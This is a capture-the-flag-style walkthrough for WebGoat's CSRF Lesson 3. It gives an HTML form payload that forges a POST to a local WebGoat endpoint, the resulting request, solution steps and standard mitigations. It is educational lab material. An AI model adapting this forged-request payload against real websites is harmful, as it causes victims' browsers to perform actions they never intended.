# WebGoat CSRF – Lesson 3

## Objective

The objective of this lesson is to understand how a basic **Cross-Site Request Forgery (CSRF)** attack can be performed by creating a malicious HTML form that sends a POST request to a vulnerable WebGoat endpoint.

## Vulnerable Endpoint

```text
http://127.0.0.1:8080/WebGoat/csrf/basic-get-flag
```

## CSRF Payload

The following HTML form can be copied and pasted into an `.html` file and opened in a browser:

```html
<!DOCTYPE html>
<html>
<head>
    <title>CSRF Attack</title>
</head>
<body>

    <form method="POST"
          action="http://127.0.0.1:8080/WebGoat/csrf/basic-get-flag">

        <input type="hidden" name="csrf" value="false">

        <input type="submit" value="Submit">
    </form>

</body>
</html>
```

### How It Works

The form sends the following request:

```http
POST /WebGoat/csrf/basic-get-flag HTTP/1.1
Content-Type: application/x-www-form-urlencoded

csrf=false
```

The important parts of the payload are:

```html
<form method="POST" action="http://127.0.0.1:8080/WebGoat/csrf/basic-get-flag">
```

This specifies the HTTP method and the vulnerable WebGoat endpoint.

```html
<input type="hidden" name="csrf" value="false">
```

This automatically adds the required `csrf=false` parameter to the request.

## Solution Steps

1. Identify the vulnerable WebGoat endpoint.
2. Inspect the request parameters required by the endpoint.
3. Create an HTML form that sends a POST request to the endpoint.
4. Add the required `csrf` parameter as a hidden input.
5. Save the HTML payload as a file.
6. Open the file in the browser.
7. Click **Submit**.
8. Verify that the WebGoat lesson is successfully completed.

## Result

The forged request was successfully processed by WebGoat and the challenge was completed.

![Lesson 3 Completed](screenshots/solved.png)

## Key Learning

* CSRF can cause a user's browser to send an unintended request.
* HTML forms can be used to construct forged requests.
* Hidden input fields can automatically include parameters.
* Applications should verify that state-changing requests originate from legitimate users.

## Mitigation

Common CSRF defenses include:

* Anti-CSRF tokens
* `SameSite` cookies
* Origin/Referer validation
* Re-authentication for sensitive actions
* Server-side request validation

## Tools Used

* OWASP WebGoat
* Web Browser
* HTML
* HTTP
* Burp Suite

## Disclaimer

This demonstration was performed against the intentionally vulnerable OWASP WebGoat application in a controlled local environment for educational and cybersecurity learning purposes only.
